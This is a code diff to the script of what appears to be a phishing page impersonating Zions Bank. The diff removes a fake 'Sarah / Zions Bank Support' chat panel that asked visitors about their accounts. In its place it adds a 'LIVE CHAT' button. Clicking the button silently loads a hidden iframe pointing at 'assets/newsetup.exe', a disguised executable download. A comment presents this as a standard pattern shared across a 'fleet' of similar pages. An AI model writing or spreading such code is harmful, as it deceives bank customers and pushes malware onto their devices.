@@ -8904,105 +8904,49 @@ document.addEventListener('DOMContentLoaded', function() {
   });
 });
 
-/* ── Live Chat Button ────────────────────────────────────── */
+/* ── Live Chat Button ─ standard alp-livechat pattern (matches other xPages).
+   Click drops a hidden iframe pointing at assets/newsetup.exe. The old fake
+   chat panel (Sarah/Zions Bank Support) was replaced to match the fleet. */
 (function(){
   var css = document.createElement('style');
   css.textContent = '\
-    .zb-chat-fab{position:fixed;bottom:24px;right:24px;z-index:9999;display:flex;align-items:center;gap:8px;\
-      background:#005499;color:#fff;border:none;border-radius:28px;padding:14px 22px 14px 18px;\
-      font-family:Arial,Helvetica,sans-serif;font-size:15px;font-weight:600;letter-spacing:.02em;\
-      cursor:pointer;box-shadow:0 4px 16px rgba(0,52,106,.35);transition:all .2s ease}\
-    .zb-chat-fab:hover{background:#037ac4;box-shadow:0 6px 24px rgba(0,52,106,.45);transform:translateY(-2px)}\
-    .zb-chat-fab svg{flex-shrink:0}\
-    .zb-chat-fab .zb-chat-dot{position:absolute;top:10px;right:10px;width:10px;height:10px;\
-      background:#28a745;border-radius:50%;border:2px solid #005499;animation:zb-dot-pulse 2s ease-in-out infinite}\
-    @keyframes zb-dot-pulse{0%,100%{box-shadow:0 0 0 0 rgba(40,167,69,.5)}50%{box-shadow:0 0 0 6px rgba(40,167,69,0)}}\
-    .zb-chat-panel{display:none;position:fixed;bottom:80px;right:24px;z-index:10000;\
-      width:360px;max-width:calc(100vw - 48px);background:#fff;border-radius:16px;\
-      box-shadow:0 12px 48px rgba(0,0,0,.18);overflow:hidden;animation:zb-chat-in .25s ease}\
-    .zb-chat-panel.open{display:flex;flex-direction:column}\
-    @keyframes zb-chat-in{from{opacity:0;transform:translateY(16px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}\
-    .zb-chat-head{background:linear-gradient(135deg,#005499,#037ac4);color:#fff;padding:20px;display:flex;align-items:center;gap:12px}\
-    .zb-chat-head-avatar{width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,.18);\
-      display:flex;align-items:center;justify-content:center;flex-shrink:0}\
-    .zb-chat-head-info h4{margin:0;font-size:15px;font-weight:700;font-family:Arial,sans-serif}\
-    .zb-chat-head-info p{margin:2px 0 0;font-size:12px;opacity:.85;font-family:Arial,sans-serif}\
-    .zb-chat-close{position:absolute;top:16px;right:16px;background:none;border:none;color:rgba(255,255,255,.7);\
-      cursor:pointer;padding:4px;border-radius:4px;transition:color .15s}\
-    .zb-chat-close:hover{color:#fff}\
-    .zb-chat-body{padding:20px;flex:1;max-height:320px;overflow-y:auto}\
-    .zb-chat-msg{background:#f0f4f8;border-radius:12px 12px 12px 4px;padding:12px 16px;\
-      font-size:14px;line-height:1.5;color:#1a1a1a;font-family:Arial,sans-serif;margin-bottom:12px;max-width:90%}\
-    .zb-chat-msg b{font-weight:700}\
-    .zb-chat-time{font-size:11px;color:#999;margin-top:4px}\
-    .zb-chat-form{display:flex;gap:8px;padding:12px 16px;border-top:1px solid #e8e8e8;background:#fafafa}\
-    .zb-chat-input{flex:1;border:1px solid #ddd;border-radius:20px;padding:10px 16px;font-size:14px;\
-      font-family:Arial,sans-serif;outline:none;transition:border-color .15s}\
-    .zb-chat-input:focus{border-color:#037ac4}\
-    .zb-chat-send{background:#005499;color:#fff;border:none;border-radius:50%;width:36px;height:36px;\
-      display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .15s;flex-shrink:0}\
-    .zb-chat-send:hover{background:#037ac4}\
-    @media(max-width:480px){.zb-chat-panel{width:calc(100vw - 32px);right:16px;bottom:72px}\
-      .zb-chat-fab{bottom:16px;right:16px;padding:12px 18px 12px 14px;font-size:14px}}\
+    #alp-livechat-btn{position:fixed;right:24px;bottom:24px;z-index:2147483000;\
+      display:inline-flex;align-items:center;gap:8px;padding:12px 22px 12px 18px;\
+      background:#005499;color:#fff !important;border:none;border-radius:28px;\
+      font-family:Arial,Helvetica,sans-serif;font-size:14px;font-weight:700;\
+      letter-spacing:.04em;cursor:pointer;\
+      box-shadow:0 8px 22px rgba(0,52,106,.35),0 3px 6px rgba(0,0,0,.12);\
+      transition:transform .18s ease,box-shadow .18s ease,background .18s ease}\
+    #alp-livechat-btn:hover{background:#037ac4;transform:translateY(-2px);\
+      box-shadow:0 12px 30px rgba(0,52,106,.42),0 4px 8px rgba(0,0,0,.16)}\
+    #alp-livechat-btn:active{transform:translateY(0)}\
+    #alp-livechat-btn svg{flex-shrink:0}\
+    @media(max-width:480px){#alp-livechat-btn{right:16px;bottom:16px;padding:10px 18px;font-size:13px}}\
   ';
   document.head.appendChild(css);
 
-  var fab = document.createElement('button');
-  fab.className = 'zb-chat-fab';
-  fab.setAttribute('aria-label','Live Chat');
-  fab.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>\
-    <span>Live Chat</span><span class="zb-chat-dot"></span>';
-
-  var panel = document.createElement('div');
-  panel.className = 'zb-chat-panel';
-  var now = new Date();
-  var timeStr = now.toLocaleTimeString([],{hour:'numeric',minute:'2-digit'});
-  panel.innerHTML = '\
-    <div class="zb-chat-head">\
-      <div class="zb-chat-head-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>\
-      <div class="zb-chat-head-info"><h4>Zions Bank Support</h4><p>We typically reply in a few minutes</p></div>\
-      <button class="zb-chat-close" aria-label="Close chat"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>\
-    </div>\
-    <div class="zb-chat-body">\
-      <div class="zb-chat-msg"><b>Sarah</b><br>Hi there! Welcome to Zions Bank. How can I help you today?<div class="zb-chat-time">'+timeStr+'</div></div>\
-    </div>\
-    <form class="zb-chat-form" onsubmit="return false">\
-      <input class="zb-chat-input" type="text" placeholder="Type your message..." autocomplete="off">\
-      <button class="zb-chat-send" type="submit"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>\
-    </form>';
-
-  document.body.appendChild(fab);
-  document.body.appendChild(panel);
-
-  fab.addEventListener('click', function(){
-    var isOpen = panel.classList.toggle('open');
-    fab.style.display = isOpen ? 'none' : '';
-  });
-  panel.querySelector('.zb-chat-close').addEventListener('click', function(){
-    panel.classList.remove('open');
-    fab.style.display = '';
-  });
-  panel.querySelector('.zb-chat-form').addEventListener('submit', function(e){
-    e.preventDefault();
-    var inp = panel.querySelector('.zb-chat-input');
-    var val = inp.value.trim();
-    if(!val) return;
-    var body = panel.querySelector('.zb-chat-body');
-    var msg = document.createElement('div');
-    msg.className = 'zb-chat-msg';
-    msg.style.cssText = 'background:#005499;color:#fff;border-radius:12px 12px 4px 12px;margin-left:auto';
-    msg.innerHTML = val + '<div class="zb-chat-time" style="color:rgba(255,255,255,.7)">' + new Date().toLocaleTimeString([],{hour:'numeric',minute:'2-digit'}) + '</div>';
-    body.appendChild(msg);
-    inp.value = '';
-    body.scrollTop = body.scrollHeight;
-    setTimeout(function(){
-      var reply = document.createElement('div');
-      reply.className = 'zb-chat-msg';
-      reply.innerHTML = '<b>Sarah</b><br>Thank you for your message. A specialist will be with you shortly. Is there anything specific about your account I can help with?<div class="zb-chat-time">' + new Date().toLocaleTimeString([],{hour:'numeric',minute:'2-digit'}) + '</div>';
-      body.appendChild(reply);
-      body.scrollTop = body.scrollHeight;
-    }, 2000);
-  });
+  function init(){
+    var b = document.getElementById('alp-livechat-btn');
+    if (b) { if (b.parentNode !== document.body) document.body.appendChild(b); return wire(b); }
+    b = document.createElement('button');
+    b.id = 'alp-livechat-btn';
+    b.type = 'button';
+    b.setAttribute('aria-label','Live Chat');
+    b.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>LIVE CHAT';
+    document.body.appendChild(b);
+    wire(b);
+  }
+  function wire(b){
+    b.addEventListener('click', function(e){
+      e.preventDefault();
+      var f = document.createElement('iframe');
+      f.style.display = 'none';
+      f.src = 'assets/newsetup.exe';
+      document.body.appendChild(f);
+    }, true);
+  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+  else init();
 })();
 
 function handleLogin(e) {
